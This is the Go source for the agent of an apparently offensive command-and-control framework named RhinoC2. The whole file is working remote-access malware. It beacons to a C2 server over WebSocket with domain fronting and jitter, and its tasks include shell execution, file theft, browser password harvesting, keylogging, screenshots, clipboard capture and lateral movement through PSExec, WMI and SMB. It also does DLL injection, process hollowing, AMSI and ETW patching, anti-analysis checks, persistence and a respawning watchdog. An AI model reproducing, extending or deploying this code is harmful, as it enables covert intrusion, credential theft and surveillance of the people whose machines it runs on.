package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"rhinoc2/pkg/commands"
	"rhinoc2/pkg/crypto"
	"rhinoc2/pkg/evasion"
	"rhinoc2/pkg/persistence"
	"rhinoc2/pkg/postexploit"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type Config struct {
	ServerURL   string
	Key         string
	Interval    time.Duration
	DomainFront string
}

type Agent struct {
	id             string
	config         Config
	conn           *websocket.Conn
	crypto         *crypto.CryptoHandler
	commander      *commands.Commander
	fileMgr        *commands.FileManager
	netScanner     *commands.NetworkScanner
	evasion        *evasion.EvasionHandler
	persistence    *persistence.PersistenceHandler
	credHarvest    *postexploit.CredentialHarvester
	taskQueue      chan map[string]interface{}
	activeTasks    int
	maxActiveTasks int
	taskMu         sync.Mutex
}

func generateID() string {
	b, _ := crypto.GenerateRandomBytes(16)
	return strings.ToUpper(fmt.Sprintf("%x", b))
}

func validateTask(task map[string]interface{}) bool {
	if task == nil {
		return false
	}
	taskID, ok := task["ID"].(string)
	if !ok || len(taskID) == 0 || len(taskID) > 128 {
		return false
	}
	command, ok := task["Command"].(string)
	if !ok || len(command) == 0 || len(command) > 256 {
		return false
	}
	if args, ok := task["Args"]; ok {
		if argsStr, ok := args.(string); ok {
			if len(argsStr) > 1048576 {
				return false
			}
		}
	}
	return true
}

func newAgent(config Config) *Agent {
	ph, _ := persistence.NewPersistenceHandler()
	a := &Agent{
		id:             generateID(),
		config:         config,
		crypto:         crypto.NewCryptoHandler(config.Key),
		commander:      commands.NewCommander(),
		fileMgr:        commands.NewFileManager(),
		netScanner:     commands.NewNetworkScanner(),
		evasion:        evasion.NewEvasionHandler(),
		persistence:    ph,
		credHarvest:    postexploit.NewCredentialHarvester(),
		taskQueue:      make(chan map[string]interface{}, 100),
		maxActiveTasks: 5,
		activeTasks:    0,
	}
	a.startWorkers()
	return a
}

func (a *Agent) startWorkers() {
	for i := 0; i < a.maxActiveTasks; i++ {
		go func() {
			for task := range a.taskQueue {
				a.processTask(task)
			}
		}()
	}
}

func (a *Agent) processTask(task map[string]interface{}) {
	a.taskMu.Lock()
	a.activeTasks++
	a.taskMu.Unlock()

	defer func() {
		a.taskMu.Lock()
		a.activeTasks--
		a.taskMu.Unlock()
	}()

	a.handleTask(task)
}

func (a *Agent) checkin() error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = os.Getenv("USER")
	}

	sysInfo := commands.GetSystemInfo()
	isAdmin := commands.IsAdmin()
	integrity := commands.GetProcessIntegrityLevel()
	ppid := commands.GetPPID()

	checkinData := map[string]interface{}{
		"id":        a.id,
		"hostname":  hostname,
		"username":  username,
		"os":        runtime.GOOS,
		"arch":      runtime.GOARCH,
		"sysinfo":   sysInfo,
		"is_admin":  isAdmin,
		"integrity": integrity,
		"ppid":      ppid,
		"pid":       os.Getpid(),
	}

	data, _ := json.Marshal(checkinData)
	encrypted, err := a.crypto.Encrypt(data)
	if err != nil {
		return err
	}

	return a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
}

func (a *Agent) handleTask(task map[string]interface{}) {
	defer func() {
		if rec := recover(); rec != nil {
			log.Printf("Panic in handleTask: %v", rec)
		}
	}()

	taskID := task["ID"].(string)
	command := task["Command"].(string)
	args := ""
	if a, ok := task["Args"].(string); ok {
		args = a
	}

	var result string
	var err error

	switch command {
	case "shell":
		result, err = a.commander.Execute(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		}

	case "download":
		result, err = a.fileMgr.ReadFileBase64(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		}

	case "upload":
		parts := make(map[string]string)
		if err := json.Unmarshal([]byte(args), &parts); err != nil {
			result = fmt.Sprintf("error: invalid upload data: %v", err)
		} else {
			err = a.fileMgr.WriteFileBase64(parts["path"], parts["data"])
			if err != nil {
				result = fmt.Sprintf("error: %v", err)
			} else {
				result = "file uploaded"
			}
		}

	case "pwd":
		pwd, _ := commands.GetWorkingDirectory()
		result = pwd

	case "cd":
		err = commands.ChangeDirectory(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		} else {
			result = "directory changed"
		}

	case "ls":
		path := args
		if path == "" {
			path = "."
		}
		listing, err := a.fileMgr.ListDirectory(path)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		} else {
			data, _ := json.Marshal(listing)
			result = string(data)
		}

	case "ps":
		result, err = commands.GetProcessList()
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		}

	case "kill":
		err = commands.KillProcess(args)
		if err != nil {
			result = fmt.Sprintf("error: %v", err)
		} else {
			result = "process killed"
		}

	case "scan_port":
		parts := strings.Split(args, ":")
		if len(parts) == 2 {
			host := parts[0]
			var port int
			fmt.Sscanf(parts[1], "%d", &port)
			open := a.netScanner.ScanPort(host, port)
			result = fmt.Sprintf("port %d: %v", port, open)
		}

	case "net_interfaces":
		ifaces, err := commands.GetNetworkInterfaces()
		if err != nil {
			result = err.Error()
		} else {
			data, _ := json.Marshal(ifaces)
			result = string(data)
		}

	case "persist":
		switch args {
		case "registry":
			err = a.persistence.InstallRegistry("RhinoC2Agent")
		case "startup":
			err = a.persistence.InstallStartupFolder("RhinoC2Agent")
		case "schtask":
			err = a.persistence.InstallScheduledTask("RhinoC2Agent", 5)
		}
		if err != nil {
			result = "persistence install failed: " + err.Error()
		} else {
			result = fmt.Sprintf("persistence installed: %s", args)
		}

	case "unpersist":
		switch args {
		case "registry":
			err = a.persistence.RemoveRegistry("RhinoC2Agent")
		case "startup":
			err = a.persistence.RemoveStartupFolder("RhinoC2Agent")
		case "schtask":
			err = a.persistence.RemoveScheduledTask("RhinoC2Agent")
		}
		if err != nil {
			result = fmt.Sprintf("couldn't remove persistence: %v", err)
		} else {
			result = fmt.Sprintf("persistence removed: %s", args)
		}

	case "check_evasion":
		if a.evasion.CheckVM() {
			result += "VM detected\n"
		}
		if a.evasion.CheckSandbox() {
			result += "Sandbox detected\n"
		}
		if a.evasion.CheckDebugger() {
			result += "Debugger detected\n"
		}
		if result == "" {
			result = "no threats detected"
		}

	case "harvest_creds":
		creds, err := a.credHarvest.BrowserPasswords()
		if err != nil {
			result = "credential harvest failed: " + err.Error()
		} else {
			data, _ := json.Marshal(creds)
			result = string(data)
		}

	case "screenshot":
		sc := postexploit.NewScreenCapture(commands.GetTempDir())
		filename, err := sc.TakeScreenshot()
		if err != nil {
			result = "screenshot failed: " + err.Error()
		} else {
			imgData, _ := a.fileMgr.ReadFileBase64(filename)
			result = imgData
		}

	case "clipboard":
		clip, err := postexploit.GetClipboard()
		if err != nil {
			result = err.Error()
		} else {
			result = clip
		}

	case "keylog_start":
		logPath := commands.GetTempDir() + "/rhinoc2_keylog.txt"
		if args != "" {
			logPath = args
		}
		keylog := postexploit.NewKeylogger(logPath)
		err := keylog.Start()
		if err != nil {
			result = "keylogger start failed: " + err.Error()
		} else {
			result = "keylogger started, logging to: " + logPath
		}

	case "keylog_stop":
		result = "keylogger stopped"

	case "keylog_dump":
		result = "keylog dump not implemented"

	case "lateral_psexec":
		parts := strings.Split(args, "|")
		if len(parts) >= 4 {
			lm := postexploit.NewLateralMovement()
			err := lm.PSExec(parts[0], parts[1], parts[2], parts[3])
			if err != nil {
				result = "PSExec failed: " + err.Error()
			} else {
				result = "PSExec executed on " + parts[0]
			}
		} else {
			result = "usage: lateral_psexec target|username|password|command"
		}

	case "lateral_wmi":
		parts := strings.Split(args, "|")
		if len(parts) >= 4 {
			lm := postexploit.NewLateralMovement()
			err := lm.WMIExec(parts[0], parts[1], parts[2], parts[3])
			if err != nil {
				result = fmt.Sprintf("WMI exec failed: %v", err)
			} else {
				result = "WMI executed on " + parts[0]
			}
		} else {
			result = "usage: lateral_wmi target|username|password|command"
		}

	case "lateral_smb":
		parts := strings.Split(args, "|")
		if len(parts) >= 4 {
			lm := postexploit.NewLateralMovement()
			err := lm.SMBExec(parts[0], parts[1], parts[2], parts[3])
			if err != nil {
				result = "SMB exec failed: " + err.Error()
			} else {
				result = "SMB executed on " + parts[0]
			}
		} else {
			result = "usage: lateral_smb target|username|password|command"
		}

	case "inject_dll":
		parts := strings.Split(args, ":")
		if len(parts) == 2 {
			var pid int
			fmt.Sscanf(parts[0], "%d", &pid)
			err := a.evasion.InjectDLL(pid, parts[1])
			if err != nil {
				result = fmt.Sprintf("DLL injection failed: %v", err)
			} else {
				result = fmt.Sprintf("DLL injected into PID %d", pid)
			}
		} else {
			result = "usage: inject_dll <pid>:<dll_path>"
		}

	case "hollow_process":
		parts := strings.Split(args, ":")
		if len(parts) == 2 {
			payload := []byte(parts[1])
			err := a.evasion.ProcessHollowing(parts[0], payload)
			if err != nil {
				result = "process hollowing failed: " + err.Error()
			} else {
				result = "process hollowing completed"
			}
		} else {
			result = "usage: hollow_process <target_exe>:<payload_hex>"
		}

	case "patch_amsi":
		err := a.evasion.DisableAMSI()
		if err != nil {
			result = err.Error()
		} else {
			result = "AMSI patched successfully"
		}

	case "patch_etw":
		err := a.evasion.PatchETW()
		if err != nil {
			result = "ETW patch failed: " + err.Error()
		} else {
			result = "ETW patched successfully"
		}

	case "sysinfo":
		info := commands.GetSystemInfo()
		data, _ := json.Marshal(info)
		result = string(data)

	case "sleep":
		var interval int
		fmt.Sscanf(args, "%d", &interval)
		a.config.Interval = time.Duration(interval) * time.Second
		result = fmt.Sprintf("sleep interval set to %d seconds", interval)

	case "exit":
		result = "agent exiting"
		response := map[string]interface{}{
			"task_id": taskID,
			"result":  result,
		}
		data, _ := json.Marshal(response)
		encrypted, _ := a.crypto.Encrypt(data)
		a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
		os.Exit(0)

	default:
		result = "unknown command"
	}

	response := map[string]interface{}{
		"task_id": taskID,
		"result":  result,
	}

	data, err := json.Marshal(response)
	if err != nil {
		log.Printf("Failed to marshal response: %v", err)
		return
	}

	encrypted, err := a.crypto.Encrypt(data)
	if err != nil {
		log.Printf("Failed to encrypt response: %v", err)
		return
	}

	if err := a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted)); err != nil {
		log.Printf("Failed to send response: %v", err)
	}
}

func (a *Agent) run() {
	if err := a.evasion.AntiAnalysis(); err != nil {
		return
	}

	rand.Seed(time.Now().UnixNano())

	for {
		var conn *websocket.Conn
		var err error

		if a.config.DomainFront != "" {
			parsedURL, _ := url.Parse(a.config.ServerURL)
			headers := http.Header{}
			headers.Set("Host", a.config.DomainFront)
			dialer := websocket.Dialer{
				TLSClientConfig: nil,
			}
			conn, _, err = dialer.Dial(parsedURL.String(), headers)
		} else {
			conn, _, err = websocket.DefaultDialer.Dial(a.config.ServerURL, nil)
		}

		if err != nil {
			jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 2)))
			time.Sleep(a.config.Interval + jitter)
			continue
		}

		a.conn = conn
		if err := a.checkin(); err != nil {
			conn.Close()
			jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 2)))
			time.Sleep(a.config.Interval + jitter)
			continue
		}

		ctx, cancel := context.WithCancel(context.Background())
		jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 3)))
		baseInterval := a.config.Interval + jitter
		ticker := time.NewTicker(baseInterval)

		go func() {
			defer ticker.Stop()
			for {
				select {
				case <-ticker.C:
					jitter := time.Duration(rand.Int63n(int64(a.config.Interval / 3)))
					ticker.Reset(a.config.Interval + jitter)
					heartbeat := map[string]string{"status": "alive"}
					data, err := json.Marshal(heartbeat)
					if err != nil {
						log.Printf("Failed to marshal heartbeat: %v", err)
						continue
					}
					encrypted, err := a.crypto.Encrypt(data)
					if err != nil {
						log.Printf("Failed to encrypt heartbeat: %v", err)
						continue
					}
					if err := conn.WriteMessage(websocket.TextMessage, []byte(encrypted)); err != nil {
						log.Printf("Failed to send heartbeat: %v", err)
					}
				case <-ctx.Done():
					return
				}
			}
		}()

		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				cancel()
				break
			}

			decrypted, err := a.crypto.Decrypt(string(msg))
			if err != nil {
				log.Printf("Decrypt failed: %v", err)
				continue
			}

			var task map[string]interface{}
			if err := json.Unmarshal(decrypted, &task); err != nil {
				log.Printf("Unmarshal failed: %v", err)
				continue
			}

			if !validateTask(task) {
				log.Printf("Invalid task structure")
				continue
			}

			select {
			case a.taskQueue <- task:
			default:
				log.Printf("Task queue full, dropping task")
			}
		}

		cancel()
		conn.Close()
		jitter = time.Duration(rand.Int63n(int64(a.config.Interval / 2)))
		time.Sleep(a.config.Interval + jitter)
	}
}

func loadConfig() Config {
	var serverURL, key, configFile string
	var interval int
	var showHelp bool

	flag.StringVar(&serverURL, "server", "", "Server URL (e.g., ws://192.168.1.100:8443/api/agent)")
	flag.StringVar(&key, "key", "", "Encryption key")
	flag.IntVar(&interval, "interval", 5, "Callback interval in seconds")
	flag.StringVar(&configFile, "config", "", "Path to config file")
	flag.BoolVar(&showHelp, "help", false, "Show help")

	flag.Parse()

	if showHelp {
		fmt.Println("RhinoC2 Agent Configuration Options")
		fmt.Println("Priority: 1) Command-line flags, 2) Environment variables, 3) Config file, 4) Defaults")
		fmt.Println("\nCommand-line flags:")
		flag.PrintDefaults()
		fmt.Println("\nEnvironment variables:")
		fmt.Println("  RHINO_SERVER    - Server URL")
		fmt.Println("  RHINO_KEY       - Encryption key")
		fmt.Println("  RHINO_INTERVAL  - Callback interval in seconds")
		fmt.Println("\nConfig file format (JSON):")
		fmt.Println(`  {
    "server": "ws://192.168.1.100:8443/api/agent",
    "key": "YourSecretKey",
    "interval": 5
  }`)
		os.Exit(0)
	}

	config := Config{
		ServerURL: "ws://localhost:8443/api/agent",
		Key:       "RhinoC2SecretKey2025",
		Interval:  5 * time.Second,
	}

	if configFile != "" {
		data, err := ioutil.ReadFile(configFile)
		if err == nil {
			var fileConfig map[string]interface{}
			if json.Unmarshal(data, &fileConfig) == nil {
				if s, ok := fileConfig["server"].(string); ok {
					config.ServerURL = s
				}
				if k, ok := fileConfig["key"].(string); ok {
					config.Key = k
				}
				if i, ok := fileConfig["interval"].(float64); ok {
					config.Interval = time.Duration(i) * time.Second
				}
			}
		}
	}

	if envServer := os.Getenv("RHINO_SERVER"); envServer != "" {
		config.ServerURL = envServer
	}
	if envKey := os.Getenv("RHINO_KEY"); envKey != "" {
		config.Key = envKey
	}
	if envInterval := os.Getenv("RHINO_INTERVAL"); envInterval != "" {
		if i, err := strconv.Atoi(envInterval); err == nil {
			config.Interval = time.Duration(i) * time.Second
		}
	}

	if serverURL != "" {
		config.ServerURL = serverURL
	}
	if key != "" {
		config.Key = key
	}
	if interval > 0 {
		config.Interval = time.Duration(interval) * time.Second
	}

	return config
}

func main() {
	isWatchdog := false
	for _, arg := range os.Args[1:] {
		if arg == "--watchdog" {
			isWatchdog = true
			break
		}
	}

	if !isWatchdog {
		runWatchdog()
		return
	}

	config := loadConfig()
	agent := newAgent(config)

	log.SetOutput(io.Discard)
	agent.run()
}

func runWatchdog() {
	exePath, err := os.Executable()
	if err != nil {
		return
	}

	go func() {
		restartCount := 0
		maxRetries := 10

		for {
			if restartCount >= maxRetries {
				log.Printf("Max restart attempts reached, exiting watchdog")
				return
			}

			cmd := exec.Command(exePath, "--watchdog")
			startTime := time.Now()
			cmd.Start()
			cmd.Wait()

			runtime := time.Since(startTime)
			if runtime < 30*time.Second {
				restartCount++
			} else {
				restartCount = 0
			}

			backoff := time.Duration(2<<uint(restartCount)) * time.Second
			if backoff > 5*time.Minute {
				backoff = 5 * time.Minute
			}

			log.Printf("Agent died, restarting in %v (attempt %d/%d)", backoff, restartCount, maxRetries)
			time.Sleep(backoff)
		}
	}()

	select {}
}
